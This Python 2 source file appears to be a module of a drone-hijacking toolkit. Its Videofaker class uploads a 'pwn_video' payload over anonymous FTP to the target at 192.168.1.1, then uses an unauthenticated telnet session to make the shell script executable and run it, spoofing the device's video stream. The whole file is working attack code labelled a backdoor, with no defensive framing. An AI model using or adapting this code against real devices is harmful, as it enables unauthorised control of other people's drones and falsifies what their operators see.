import ftplib, os
from telnetlib import Telnet
from lib.parser import SkyjackArgumentParser


class Videofaker():
    def __init__(self):
        self.cmd = "video"
        self.files = ['pwn_video', 'pwn_video.sh']
        self.timeout = 5
        self.parser = SkyjackArgumentParser(prog=self.cmd, description="fake video stream")

    def execute(self, args):
        "fake video stream"
        #wtf that check should be done by the parser

        try:
            for f in self.files:
                os.stat('./res/video/' + f)

        except OSError as e:
            print f, ' does not exist in res folder'
            return -1

        self.upload()
        self.executeBackdoor()

        return 0

    def upload(self):
        try:
            session = ftplib.FTP('192.168.1.1')  # anonymous
            for file in self.files:
                print '[*] uploading %s' % file
                f = open('./res/video/' + file, 'rb')
                session.storbinary('STOR ' + file, f)
                f.close()
            session.quit()
        except Exception as e:
            print '[ERROR] ftp upload failed'
            print e.message

        finally:
            return 0


    def executeBackdoor(self):
        try:
            tn = Telnet('192.168.1.1')
            print '[+] connection established'
            tn.read_until('#', self.timeout)

            #make
            self.tcmd('chmod +x /data/video/pwn_video.sh', tn)
            self.tcmd('/data/video/pwn_video.sh', tn)

        except Exception as e:
            print '[ERROR] telnet command execution failed'
            print e.message

        finally:
            return 0

    def tcmd(self, cmd, tn):
        #print '[+] executing %s ' % cmd
        tn.write(cmd + '\n')
        print tn.read_until('#', self.timeout)

        return 0


